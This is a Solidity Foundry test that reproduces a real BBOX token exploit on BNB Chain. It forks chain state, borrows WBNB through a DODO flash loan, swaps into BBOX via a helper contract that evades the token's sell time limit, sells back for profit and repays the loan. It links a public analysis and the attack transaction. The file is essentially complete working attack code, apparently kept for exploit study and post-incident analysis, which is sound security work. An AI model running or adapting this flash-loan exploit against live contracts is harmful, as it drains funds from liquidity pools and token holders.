// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/AnciliaInc/status/1599599614490877952
// @TX
// https://bscscan.com/tx/0xac57c78881a7c00dfbac0563e21b5ae3a8e3f9d1b07198a27313722a166cc0a3

contract ContractTest is Test {
    IERC20 BBOX = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    uint256 flashLoanAmount;
    address contractAddress;
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_106_506);
    }

    function testExploit() public {
        WBNB.approve(address(Router), type(uint256).max);
        BBOX.approve(address(Router), type(uint256).max);
        TransferBBOXHelp transferHelp = new TransferBBOXHelp(); // sell time limit
        contractAddress = address(transferHelp);
        flashLoanAmount = WBNB.balanceOf(dodo);
        DVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
        WBNBToBBOX();
        contractAddress.call(abi.encodeWithSignature("transferBBOX()"));
        BBOXToWBNB();
        WBNB.transfer(dodo, flashLoanAmount);
    }

    function WBNBToBBOX() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BBOX);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1300 * 1e18, 0, path, contractAddress, block.timestamp
        );
    }

    function BBOXToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BBOX);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BBOX.balanceOf(address(this)) * 90 / 100, 0, path, address(this), block.timestamp
        );
    }
}

contract TransferBBOXHelp {
    IERC20 BBOX = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);

    function transferBBOX() external {
        BBOX.transfer(msg.sender, BBOX.balanceOf(address(this)));
    }
}
